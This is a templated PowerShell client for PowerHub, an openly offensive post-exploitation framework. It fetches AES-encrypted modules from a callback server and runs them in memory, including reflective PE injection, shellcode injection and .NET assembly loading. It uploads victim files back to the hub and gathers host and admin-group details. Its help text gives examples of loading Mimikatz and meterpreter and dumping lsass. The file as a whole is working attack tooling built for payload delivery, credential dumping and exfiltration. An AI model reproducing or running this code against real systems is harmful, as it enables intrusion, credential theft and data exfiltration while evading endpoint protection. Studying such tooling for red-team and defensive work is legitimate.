$FooterLeft = "{{VERSION}}"
$FooterRight = "written by Adrian Vollmer, 2018-2023"
$SpaceBuffer = " "*(64-2-$FooterLeft.Length-$FooterRight.Length)
Write-Output @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
$($FooterLeft, $SpaceBuffer, $FooterRight)
Run 'Help-PowerHub' for help
"@

$KEY = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
$CALLBACK_URL = "{{callback_url}}"
$TransportScheme = "{{transport}}"
$WEBDAV_URL = "{{webdav_url}}"
$WEBDAV_USER = "{{webdav_user}}"
$WEBDAV_PASS = "{{webdav_pass}}"
{# $WebClient is defined in stage2 #}
{# The actual code (i.e. the content) of the modules is stored in this separate hashtable #}
class PowerHubModule { [String]$Name; [String]$Type; [Int]$N; [Bool]$Loaded; [String]$Alias }
$PowerHubModulesContent = @{ {{preloaded_modules_content}} }
$PowerHubModules = @( {{preloaded_modules}} )

$CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
$PS_VERSION = $PSVersionTable.PSVersion.Major
{{'$DebugPreference = "Continue"'|debug}}
{% if minimal %}
{{'Write-Debug "Minimal mode: on"'|debug}}
{% else %}
{{'Write-Debug "Minimal mode: off"'|debug}}
{% endif %}

function prompt {
    Write-Host ("PowerHub") -nonewline
    Write-Host ("@") -nonewline -foregroundcolor DarkGreen
    Write-Host ($CALLBACK_HOST) -nonewline -foregroundcolor DarkYellow
    Write-Host (" $PWD>") -nonewline
    return ' '
}

function Encrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]

    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($buffer, 0, $buffer.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData

    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
    $fullData
}

function Decrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]
    $aesManaged.IV = [byte[]]$buffer[0..15]

    $decryptor = $aesManaged.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);

    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
    $decryptedData
}

function Encrypt-String {
    param(
        [System.String]$string
  	)
    $result = [System.Text.Encoding]::UTF8.GetBytes($string)
    $result = Encrypt-AES $result $KEY
    $result = [System.Convert]::ToBase64String($result)
    $result
}

function Decrypt-String {
    param(
        [System.String]$string, [Bool]$AsBytes=$False
  	)
    $result = [System.Convert]::FromBase64String($string)
    {% if slow_encryption %}
        $result = Decrypt-RC4_ $result $KEY
    {% else %}
        $result = Decrypt-AES $result $KEY
    {% endif %}
    if (-not $AsBytes) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
    $result
}

function Transport-String {
    param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
    $args = "?t=$TransportScheme"
    foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
    {% if slow_encryption %}
        $args += '&s=t'
    {% endif %}
    $path = "${1}${args}"
    $path = Encrypt-String $path
    $path = $path.replace('/', '_').replace('+', '-')
    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${path}")) $3
}

function Unzip-Code {
     Param ( [byte[]] $byteArray )
     if ($PS_VERSION -eq 2) {
        $byteArray
     } else {
         $input = New-Object System.IO.MemoryStream( , $byteArray )
         $output = New-Object System.IO.MemoryStream
         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
         $gzipStream.CopyTo( $output )
         $gzipStream.Close()
         $input.Close()
         [byte[]] $byteOutArray = $output.ToArray()
         $byteOutArray
    }
}

function Update-HubModules {
    Write-Verbose "Updating module list..."
    $ModuleList = Transport-String "list" | ConvertFrom-Csv
    $Global:PowerHubModules = $ModuleList
    foreach ($m in $PowerHubModules) {
        $m.n = [Int]($m.n)
        $m | Add-Member -TypeName  "PowerHubModule"
        if ($PowerHubModulesContent.ContainsKey($m.Name)) {
            $m.Loaded = $True
        } else {
            $m.Loaded = $False
        }
    }
    $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
}

function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $module
    )

    $code = $PowerHubModulesContent.($module.Name)
    $sb = [Scriptblock]::Create($code)
    New-Module -ScriptBlock $sb | Out-Null

    if ($?){
        Write-Verbose ("{0} imported." -f $Module.Name)
    } else {
        Write-Error ("Failed to import {0}" -f $Module.Name)
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += [Int]$limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $PowerHubModules.length-1}
            $indices += [Int]($limits[0]) .. [Int]($limits[1])
        }
    }
    $indices
}

function List-HubModules {
{% if not minimal %}<#
.SYNOPSIS

Lists all modules that are available via the hub.

#>
    $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
}

function Get-HubModule {
<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code. If the module has already been loaded, it
simply returns the module object unless the "-Reload" flag is present.

It refreshes the module list first, so keep this in mind when referring to
modules by number.

.DESCRIPTION

Get-HubModule loads and returns a module.

.PARAMETER Expression

A regular expression. PowerHub will then load all modules that have a matching
Name.

Alternatively, you can use the number of the module, separated by commas. Can
contain a range such as "1,4-8".

.PARAMETER Reload

Force a reload of the module's code from the server.

.EXAMPLE

Get-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Get-HubModule Mimikatz

Description
-----------
Transfers the code of module 'Invoke-Mimikatz.ps1' (because the regular
expression matches) from the hub and imports it.

.EXAMPLE

Get-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.

.EXAMPLE

Get-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports them.

.NOTES

Use the '-Verbose' option to print detailed information.

#>{% endif %}
    Param(
        [parameter(Mandatory=$true)] [String] $Expression,
        [parameter(Mandatory=$false)] [Switch] $Reload
    )

    if ($Expression -match "^[0-9-,]+$") {
        $indices = Convert-IntStringToArray($Expression)
    } else {
        $indices = [Int[]]($PowerHubModules | Where { $_.Name -match $Expression } | % {$_.N})
    }

    $result = @()
    foreach ($i in $indices) {
        if ($i -lt $PowerHubModules.length -and $i -ge 0) {
            $module = $PowerHubModules[$i]
            if (($module.Loaded -eq $False) -or $Reload) {
                # Load the module from server
                Write-Verbose "Loading module $($module.name)..."
                $transport_args = @{"m"=$module.N}
                # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
                if ($module.Type -eq 'ps1') {
                    $code = Transport-String "module" $transport_args
                    $PowerHubModulesContent.($module.Name) = $code
                    Import-HubModule $module
                } else {
                    $PowerHubModulesContent.($module.Name) = Transport-String "module" $transport_args $True
                }
                $module.Loaded = $True
            }

            # Set Alias in two steps
            # 1. Get Basename
            if ($Module.Name.Contains('/')) {
                $AliasName = $Module.Name.split('/')
                $AliasName = $AliasName[$AliasName.Length - 1]
            } else {
                $AliasName = $Module.Name
            }
            # 2. Create alias
            if ($module.Type -eq 'dotnet') {
                New-DotNetAlias $module -Name $AliasName | Out-Null
            } elseif ($module.Type -eq 'pe') {
                New-ExeAlias $module -Name $AliasName | Out-Null
            }

            $result += $module
        }
    }
    return $result
}


{% if not minimal %}
function Run-Exe {
<#
.SYNOPSIS

Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.

.PARAMETER Module

A PowerHub module object of type 'pe'.

.PARAMETER ExeArgs

A string containing arguments which are passed to the PE module.

.PARAMETER OnDisk

If this switch is enabled, the PE module will be copied to disk and executed conventionally.

WARNING: Endpoint protection WILL catch malware this way.

.EXAMPLE

Run-Exe $hubModule

Description
-----------

Execute some Hub Module of type 'pe' in memory.

.EXAMPLE

Get-HubModule meterpreter.exe | Run-Exe

Description
-----------

Load the PE module with the name 'meterpreter.exe' in memory and run it.

.EXAMPLE

Get-HubModule procdump64 | Run-Exe -ExeArgs "-accepteula -ma lsass.exe lsass.dmp"

Description
-----------

Run the binary whose name matches 'procdump64' in memory and dump the lsass process.
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module,

        [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,

        [parameter(Mandatory=$false)] [Switch] $OnDisk
    )

    if ($OnDisk) {
        foreach ($m in $Module) {
            $Filename = Save-HubModule $m -Directory $env:TMP
            if ($ExeArgs) {
                Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
            } else {
                Start-Process -FilePath "$Filename"
            }
        }
    } else {
        if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
            Get-HubModule Invoke-ReflectivePEInjection
        }
        if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
            foreach ($m in $Module) {
                Invoke-ReflectivePEInjection -PEBytes $PowerHubModulesContent.($m.Name) -ForceASLR -ExeArgs $ExeArgs
            }
        } else {
            Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
        }
    }
}

function Save-HubModule {
<#
.SYNOPSIS

Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!

.PARAMETER Module

A PowerHub module object.

.PARAMETER Directory

Directory in which to save the file.

.EXAMPLE

Get-HubModule SeatBelt | Save-HubModule -Directory tmp/

Description
-----------
Save that module whose name matches "SeatBelt" to directory tmp/

.EXAMPLE

Get-HubModule meterpreter.exe | Save-HubModule

Description
-----------

Load the PE module with the name 'meterpreter.exe' in memory and save it to disk
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module,

        [parameter(Mandatory=$false,Position=1)] $Directory = ""
    )

    foreach ($m in $Module) {
        $code = $PowerHubModulesContent.($m.Name)
        $BaseName = $m.Name
        if ($BaseName -match '/') {
            $BaseName = $BaseName.split('/')
            $BaseName = $BaseName[$BaseName.Length-1]
        }
        if ($Directory) {
            $Filename = "$Directory\$BaseName"
        } else {
            $Filename = $BaseName
        }
        if ($m.Type -eq "ps1") {
            $code | Set-Content "$Filename" -Encoding UTF8
        } else {
            $code | Set-Content "$Filename" -Encoding Byte
        }
        $Filename
    }
}

function New-ExeAlias {
<#
.SYNOPSIS

Add an alias that acts as a wrapper for 'Get-HubModule|Run-Exe'.

.PARAMETER Module

A PowerHub module object of type "pe".

.PARAMETER Name

Name of the new alias. Default: the module's name.

#>
    Param(
        [parameter(Mandatory=$false)] [String] $Name,
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module
    )
    $Function = {
        $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
    }
    if ($Name) {
        $FuncName = $Name
    } else {
        $FuncName = $Module.Name
    }
    $Module.Alias = $FuncName
    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
}

function Run-Shellcode {
<#
.SYNOPSIS

Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.

.PARAMETER Module

A PowerHub module object of type "shellcode".

.PARAMETER ProcessID

A process ID of the process to be used for injection.

.EXAMPLE

Run-Shellcode $someModule

Description
-----------
Execute a HubModule of type "shellcode" in memory

.EXAMPLE

Get-HubModule meterpreter.bin | Run-Shellcode

Description
-----------

Load the shellcode module with the name 'meterpreter.bin' in memory and run it
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module,

        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
    )

    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
        Get-HubModule Invoke-Shellcode
    }
    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
    {
        foreach ($m in $Module) {
            $code = $PowerHubModulesContent.($m.Name)
            if ($ProcessID) {
                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
            } else {
                Invoke-Shellcode -Shellcode $code
            }
        }
    } else {
        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
    }
}
{% endif %}{# end of run-exe block #}

function Run-DotNETExe {
{% if not minimal %}<#
.SYNOPSIS

Executes a .NET exe module in memory, which must be loaded first.

This might trigger the anti-virus.

.PARAMETER Module

A PowerHub module object of type 'dotnet'.

.PARAMETER OutFile

Path to a file where the output is stored; by default output is printed to console

The console is different than stdout for complicated PowerShell reasons.
Use `-OutFile "-"` to redirect the output to stdout, i.e. the information stream.
However, the output will be delayed and only printed when the program finished.

.PARAMETER Arguments

An array of strings that represent the arguments which will be passed to the executable

.EXAMPLE

Get-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"

Description
-----------
Load and execute the .NET binary whose name matches "SeatBelt" in memory with
several parameters

.EXAMPLE

Get-HubModule meterpreter.exe | Run-DotNETExe

Description
-----------

Load the .NET module with the name 'meterpreter.exe' in memory and run it
#>{% endif %}

    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module,

        [parameter(Mandatory=$false)] [String] $OutFile,

        [parameter(Mandatory=$false)] [String[]] $Arguments = @()
    )

    {# Set CWD of the process to that of the powershell session #}
    [Environment]::CurrentDirectory = Get-Location

    foreach ($m in $Module) {
        $code = $PowerHubModulesContent.($m.Name)
        $a = [Reflection.Assembly]::Load([byte[]]$code)
        $al = New-Object -TypeName System.Collections.ArrayList
        $al.add($Arguments)
        if ($OutFile) {
            $OldConsoleOut=[Console]::Out
            if ($OutFile -eq '-') {
                $StreamWriter=New-Object IO.StringWriter($OutFile)
            } else {
                $StreamWriter=New-Object IO.StreamWriter($OutFile)
            }
            [Console]::SetOut($StreamWriter)
            try {
                $a.EntryPoint.Invoke($Null, $al.ToArray())
            } finally {
                [Console]::SetOut($OldConsoleOut)
            }
        } else{
            $a.EntryPoint.Invoke($Null, $al.ToArray())
        }
        if ($OutFile -eq '-') {
            $StreamWriter.toString()
        }
    }
}

function New-DotNetAlias {
<#
.SYNOPSIS

Add an alias that acts as a wrapper for 'Get-HubModule|Run-DotNETExe'.

.PARAMETER Module

A PowerHub module object of type "dotnet".

.PARAMETER Name

Name of the new alias. Default: the module's name.

#>
    Param(
        [parameter(Mandatory=$false)] [String] $Name,
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
        [PSTypeName("PowerHubModule")] $Module
    )
    $Function = {
        $Module | Run-DotNETExe -Arguments ([string[]]$args)
    }
    if ($Name) {
        $FuncName = $Name
    } else {
        $FuncName = $Module.Name
    }
    $Module.Alias = $FuncName
    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
}


function Send-Bytes {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [Byte[]]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName
    )

    if ($FileName) {
        if ([System.IO.File]::Exists($Filename)) {
            $Filename = (Get-Item $Filename).Name
        } else {
            $FileName = $FileName -replace '^\.', '' -replace '\\', '_'
        }
    } else {
        $FileName = Get-Date -Format o
    }

    {{'Write-Debug "Encrypting $Filename..."'|debug}}
    $Body = (Encrypt-AES $Body $KEY)

    if ($TransportScheme -match "^https?$") {
        Send-BytesViaHttp $Body $FileName
    }
}

function Send-BytesViaHttp {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [Byte[]]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName
    )
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $prebody = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF$LF"
    ) -join $LF
    $postbody = "$LF--$boundary--$LF"
    $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
    $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)

    $ProgressPreference = 'SilentlyContinue'
    $post_url = "$(${CALLBACK_URL})upload?script"
    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
    $WebRequest = [System.Net.WebRequest]::Create($post_url)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
    $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $WebRequest.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    $PostStream = $WebRequest.GetRequestStream()
    $PostStream.Write($prebody, 0, $prebody.Length)
    $PostStream.Write($Body, 0, $Body.Length)
    $PostStream.Write($postbody, 0, $postbody.Length)
    $PostStream.Close()
    {{'Write-Debug "Bytes sent: $($Body.Length)"'|debug}}
    {{'Write-Debug "Reading response"'|debug}}
    try {
        $Response = $WebRequest.GetResponse()
    } catch {}
}


function PushTo-Hub {
{% if not minimal %}<#
.SYNOPSIS

Uploads files back to the hub via Cmdlet.

.PARAMETER Files

An array of strings which contain the names of the files that you want to transfer.

.PARAMETER Name

Filename to be used, if the data is read from stdin. If empty, a combination of
the hostname and a timestamp will be used.

.EXAMPLE

PushTo-Hub kerberoast.txt, users.txt

Description
-----------
Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.

.EXAMPLE

Get-ChildItem | PushTo-Hub -Name "directory-listing"

#>{% endif %}
    Param(
       [Parameter(Mandatory=$False)]
       [String[]]$Files,

       [Parameter(Mandatory=$False)]
       [String[]]$Name,

       [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
       $Stream
    )

    begin {
        $result = @()
    }
    process {
        $result = $result + $Stream
    }
    end {
        if (-not $result -and -not $Files) { return }
        if (-not $Files) {
            {{'Write-Debug "Pushing stdin stream..."'|debug}}
            if ($result.length -ge 1 -and $result[0] -is [System.String]) {
                $result = $result -Join "`r`n"
                $Body = [system.Text.Encoding]::UTF8.GetBytes($result)
            } else {
                $Body = $result | ConvertTo-Json
                $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
            }
            if (-not $Name) {
                $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, ((Get-Date -Format o) -replace ":", "-")
            }
            Send-Bytes $Body $Name
        } else {
            ForEach ($file in $Files) {
                {{'Write-Debug "Pushing $File..."'|debug}}
                $abspath = (Resolve-Path $file).path
                $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                if ($Name) {
                    $filename = $name
                } else {
                    $filename = Split-Path $file -leaf
                }

                Send-Bytes $fileBin $filename
            }
        }
    }
}

$global:WebdavLetter = $Null
$global:WebdavRoLetter = $Null

function Mount-Webdav {
{% if not minimal %}<#
.SYNOPSIS

Mount the Webdav drive.

.PARAMETER RoLetter

The letter the mounted read-only drive will receive (default: 'R')

.PARAMETER Letter

The letter the mounted public drive will receive (default: 'S')

#>{% endif %}
    Param(
        [parameter(Mandatory=$False)]
        [String]$Letter = "S",
        [parameter(Mandatory=$False)]
        [String]$PrivateLetter = "O",
        [parameter(Mandatory=$False)]
        [String]$RoLetter = "R"
    )

    Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
    Set-Variable -Name "WebdavRoLetter" -Value "$RoLetter" -Scope Global
    Set-Variable -Name "WebdavPrivateLetter" -Value "$RoLetter" -Scope Global

    $shares = @{
        $Letter = $WEBDAV_URL
        $RoLetter = "${WEBDAV_URL}_ro"
        $PrivateLetter = "${WEBDAV_URL}_private"
    }

    foreach ($k in $shares.Keys) {
        $cmd = "net use ${k}: $($shares[$k]) /persistent:no"
        if ($k -eq  $PrivateLetter) {
            $cmd += " $WEBDAV_PASS /user:$WEBDAV_USER"
        }
        {{'Write-Debug "Mounting: $cmd"'|debug}}
        $cmd += " 2>&1"
        $netout = (iex $cmd)
        if (!$?) {
            Write-Error "Error while executing 'net use': $netout"
        }
    }
}


function Unmount-Webdav {
<#
.SYNOPSIS

Unmount the Webdav drive.

#>
    $shares = @($WebdavLetter, $WebdavRoLetter, $WebdavPrivateLetter)
    foreach ($k in $shares) {
        $netout = iex "net use ${k}: /delete 2>&1" | Out-Null
        if (!$?) {
            Write-Error "Error while executing 'net use': $netout"
        }
    }
}


function Get-SysInfo {
<#
.SYNOPSIS

Return some basic information about the underlying system

#>

    $IPs = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress
    $SysInfo = (Get-WMIObject win32_operatingsystem)
    $ComputerInfo = (Get-WMIObject win32_computersystem)
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $IsAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    try {
        $Groups = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf
    } catch { $Groups = @() }

    try {
        $admins = (Get-LocalGroupMember -Sid S-1-5-32-544);
    } catch { $admins = '?' }

    return  New-Object psobject -Property @{
        name = $SysInfo.name.split('|')[0];
        arch = $SysInfo.OSArchitecture;
        version = $SysInfo.version;
        hostname = $SysInfo.csname;
        manufacturer = $ComputerInfo.manufacturer;
        model = $ComputerInfo.model;
        username = $env:username;
        userdomain = $env:userdomain;
        isadmin = $IsAdmin;
        groups = $Groups;
        admins = $admins;
        releaseid = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('ReleaseID');
        IPs = $IPs
    }
}


function Help-PowerHub {
    Write-Host @"
The following functions are available (some with short aliases):
  * List-HubModules (lshm)
  * Get-HubModule (ghm)
  * Update-HubModules (uhm)
  * Get-SysInfo
  * Run-DotNETExe (rdne)
{%- if not minimal %}
  * Run-Exe (re)
  * Run-Shellcode (rsh)
{%- endif %}
  * PushTo-Hub (pth)
  * Mount-Webdav (mwd)
  * Unmount-Webdav (umwd)

{% if not minimal %}Use 'Get-Help' to learn more about those Cmdlets.
{% else %}Because minimal mode has been activated, comment-based help is not available for those Cmdlets.{% endif %}
"@
}

$Aliases = @{
    pth = "PushTo-Hub"
    ghm = "Get-HubModule"
    lshm = "List-HubModules"
    uhm = "Update-HubModules"
    rdne = "Run-DotNETExe"
    mwd = "Mount-Webdav"
    umwd = "Unmount-Webdav"
    {% if not minimal -%}
    re = "Run-Exe"
    rsh = "Run-Shellcode"
    {%- endif %}
}

foreach ($a in $Aliases.Keys) {
    try { New-Alias -Force -Name $a -Value $Aliases.$a } catch { }
}

Update-HubModules | Out-Null
foreach ($name in $PowerHubModulesContent.Keys) {
    foreach ($m in $PowerHubModules) {
        if ($m.Name -eq $name) {
            Get-HubModule $m.n | Out-Null
            break
        }
    }
}
